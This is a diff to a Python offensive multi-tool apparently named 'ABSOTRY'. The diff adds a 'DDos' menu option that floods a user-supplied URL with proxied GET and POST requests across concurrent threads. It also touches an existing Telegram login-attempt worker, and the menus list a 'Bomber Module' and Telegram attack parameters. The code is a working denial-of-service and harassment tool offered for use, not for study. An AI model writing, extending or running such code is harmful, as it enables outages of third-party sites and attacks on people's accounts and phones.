@@ -43,6 +43,7 @@ import socks
 
 
 
+
 init()
 
 
@@ -1661,7 +1662,7 @@ async def telegram_login_worker(session_name, phone_number, attempts, delay_rang
     
     try:
         await client.connect()
-        if not await client.is_connected():
+        if not client.is_connected():
             print(f"{Fore.RED}[{session_name}] Connection failed!{Style.RESET_ALL}")
             return
         
@@ -1708,7 +1709,7 @@ async def telegram_login_worker(session_name, phone_number, attempts, delay_rang
                     except:
                         pass
                     await client.connect()
-                    if not await client.is_connected():
+                    if not client.is_connected():
                         print(f"{Fore.RED}[{session_name}] Reconnect failed! Skipping thread.")
                         break
                 
@@ -1778,8 +1779,51 @@ def run_async_task(async_func, *args):
     finally:
         loop.close()
 
+################################################################################################
 
-def main():
+#DDOS
+
+################################################################################################
+
+
+def DDostask(ddtarget, ddmin, ddmax, task_id, proxy_dict=None):
+    delay = random.randint(ddmin, ddmax)
+    url = ddtarget
+    proxy_dict = get_random_proxy()
+
+    # DDOS:
+    GETsponse = requests.get(url=url, headers=headers, proxies=proxy_dict)
+    time.sleep(delay)
+    dg = GETsponse.status_code
+    print(dg)
+
+
+    # POST DDOS
+    POSTsponse = requests.post(url=url, headers=headers, proxies=proxy_dict)
+    time.sleep(delay)
+    pg = POSTsponse.status_code
+    print(pg)
+
+
+
+
+async def DDos(task_id, semaphore, ddtarget, ddmin, ddmax):
+    proxy_dict = get_random_proxy()
+    async with semaphore:
+        loop = asyncio.get_running_loop()
+        await loop.run_in_executor(None, DDostask, ddtarget, ddmin, ddmax, task_id, proxy_dict)
+
+
+
+
+
+
+
+
+################################################################################################
+
+
+async def main():
     logo = """
  ▄▄▄       ▄▄▄▄     ██████  ▒█████  ▄▄▄█████▓ ██▀███  ▓██   ██▓
 ▒████▄    ▓█████▄ ▒██    ▒ ▒██▒  ██▒▓  ██▒ ▓▒▓██ ▒ ██▒ ▒██  ██▒
@@ -1800,6 +1844,11 @@ def main():
     clear_console()
     
     # Default settings
+    ddtarget = None
+    ddattempts = None
+    ddmin = None
+    ddmax = None
+    ddthread = None
     proxies56 = None
     vkTOKEN = None
     VKvers = "5.199"
@@ -1821,6 +1870,7 @@ def main():
     PROXIES_LOADED = False
     BOMBER_CONFIG = None
     TrueCallerAPI = None
+    DDthreads = []
     
     # Telegram attack parameters
     MAX_ATTEMPTS = 5
@@ -1843,8 +1893,9 @@ def main():
             "3. Proxy Setup\n" +
             "4. Bomber Module\n" +
             "5. Telegram Operations\n" +
-            "6. Helps\n" +
-            "7. Exit Program\n" +
+            "6. DDos\n"
+            "7. Helps\n" +
+            "8. Exit Program\n" +
             "="*50 +
             "\nEnter choice: "
         )
@@ -2186,7 +2237,41 @@ def main():
             else:
                 print(f"{Fore.RED}\nERROR: Invalid selection")
 
-        elif choice == "6":
+        elif choice == '6':
+            clear_console()
+            print(Fore.WHITE + logo)
+            ddtarget = input('Target:\n>  ')
+            clear_console()
+            print(Fore.WHITE + logo)
+            ddattempts = int(input('Attempts\n>  '))
+            clear_console()
+            print(Fore.WHITE + logo)
+            ddthread = int(input('Threads\n>  '))
+            clear_console()
+            print(Fore.WHITE + logo)
+            ddmin = int(input('Min delay:\n>  '))
+            clear_console()
+            print(Fore.WHITE + logo)
+            ddmax = int(input('Max delay:\n>  '))
+            clear_console()
+            print(Fore.WHITE + logo)
+            semaphore = asyncio.Semaphore(ddthread)
+            tasks = []
+            for i in range(ddattempts):
+                task_obj = asyncio.create_task(DDos(i, semaphore, ddtarget, ddmin, ddmax))
+                tasks.append(task_obj)
+            await asyncio.gather(*tasks)
+            print('DDos attact completed')
+
+
+
+
+
+
+
+            
+
+        elif choice == "7":
             clear_console()
             print(Fore.WHITE + logo)
             print("Contact with me\nTelegram: @absotry\nEmail: 5656@tutamail.com\n")
@@ -2314,7 +2399,7 @@ For get smaller chanse for ban
             else:
                 None
                 
-        elif choice == "7":
+        elif choice == "8":
             clear_console()
             print(Fore.WHITE + logo)
             print(f"{Fore.CYAN}\nExiting program...")
@@ -2326,4 +2411,4 @@ For get smaller chanse for ban
             print(f"{Fore.RED}\nERROR: Invalid menu selection")
 
 if __name__ == '__main__':
-    main()
+    asyncio.run(main())
